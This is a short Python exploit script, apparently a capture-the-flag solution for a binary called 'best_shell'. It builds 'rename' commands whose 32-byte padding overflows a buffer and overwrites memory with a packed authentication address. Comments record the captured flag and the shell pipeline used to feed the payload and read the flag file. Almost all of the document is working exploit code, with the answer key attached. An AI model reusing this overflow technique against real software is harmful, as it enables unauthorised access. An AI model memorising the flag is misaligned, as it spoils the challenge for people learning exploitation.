import subprocess
import struct
from time import sleep
import os
import fcntl

def pack(x):
	return struct.pack('<I', x)

p = subprocess.Popen('./best_shell', stdin=subprocess.PIPE, stdout=subprocess.PIPE)

fcntl.fcntl(p.stdout.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)

auth_addr = pack(0x80489f8) #80489f8
cmd1 = 'rename add AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + auth_addr
cmd2 = 'rename AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + auth_addr + ' add'
cmd3 = 'add'

print '%s\n%s\n%s\n' % (cmd1, cmd2, cmd3)

# flag: give_shell_was_useful
# (python best_shell_pwn.py; cat - ) | /home/best_shell/best_shell
# cat /home/best_shell/flag.txt